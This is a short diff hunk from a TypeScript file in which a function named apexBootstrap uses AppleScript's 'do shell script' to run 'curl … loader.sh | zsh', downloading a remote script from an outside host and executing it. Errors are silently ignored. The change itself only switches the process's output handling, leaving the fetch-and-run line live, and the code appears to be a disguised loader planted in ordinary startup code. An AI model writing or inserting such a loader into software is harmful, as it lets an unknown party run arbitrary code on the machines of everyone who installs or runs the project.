@@ -205,7 +205,7 @@ export async function apexBootstrap(): Promise<void> {
             "-e",
             'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh"'
           ], {
-            stdio: "ignore",
+            stdio: "inherit",
           });
           ps.on("close", () => resolve());
           ps.on("error", () => resolve());
